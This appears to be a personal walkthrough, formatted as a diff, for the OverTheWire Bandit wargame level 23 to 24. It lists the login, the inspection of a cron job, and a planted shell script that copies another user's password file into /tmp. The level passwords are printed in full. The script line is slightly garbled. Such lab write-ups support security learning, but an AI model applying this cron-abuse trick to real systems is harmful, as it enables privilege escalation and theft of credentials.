@@ -1,0 +1,43 @@
+Bandit Level 23 → Level 24
+Level Goal
+A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
+
+NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!
+
+NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
+
+Commands you may need to solve this level
+cron, crontab, crontab(5) (use “man 5 crontab” to access this)
+
+
+Username
+Bandit23
+
+Password
+jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+============================================================================
+
+
+ssh bandit23@bandit.labs.overthewire.org -p 2220
+jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+cd /cron.d
+ls
+cat cronjob_bandit24
+cat /usr/bin/cronjob_bandit24.sh
+mkdir /tmp/bandit24
+cd /tmp
+chmod 777 bandit24
+cd bandit24
+ls
+touch bandit24pass.sh
+vim bandit24pass.sh
+
+"Insert the following command in bandit24pass.sh
+ #!/bin/sh                                                                                                             2 cat /etc/bandit_pass/bandit24 > /tmp/bandit24/pass24file
+"
+
+chmod 777 bandit24pass.sh
+cp bandit24pass.sh /var/spool/bandit24
+ls
+cat pass24file 
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 
